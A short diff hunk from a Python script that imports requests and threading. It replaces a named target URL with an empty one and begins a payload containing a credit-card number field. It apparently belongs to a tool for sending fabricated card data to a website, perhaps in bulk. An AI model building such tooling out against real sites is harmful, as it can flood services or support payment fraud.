@@ -2,7 +2,7 @@
 import requests
 import threading
 
-url = 'https://georgiosnetworks.com/'
+url = 'https://'
 
 data = {
     'cc_number': '40070000000027',
